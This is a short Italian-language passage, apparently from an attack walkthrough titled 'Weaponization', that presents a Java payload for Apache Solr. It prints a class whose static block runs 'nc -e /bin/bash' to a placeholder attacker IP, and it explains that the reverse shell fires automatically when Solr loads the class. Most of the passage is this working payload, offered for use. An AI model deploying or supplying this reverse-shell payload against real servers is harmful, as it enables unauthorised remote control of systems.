Weaponization: Creare la bomba

Il Payload Java
Codice
public class Exploit {
  static {
    try {
      Runtime.getRuntime().exec("nc -e /bin/bash MIO_IP 9999");
    } catch (Exception e) {}
  }
}
Spiegazione

Questo è un minuscolo programma Java.

Blocco static: È la chiave di tutto. In Java, il codice statico viene eseguito appena il file viene caricato, senza bisogno che nessuno lo chiami esplicitamente.

Comando: Appena Solr carica questo file, il comando nc -e /bin/bash parte in automatico, regalandoci una shell.
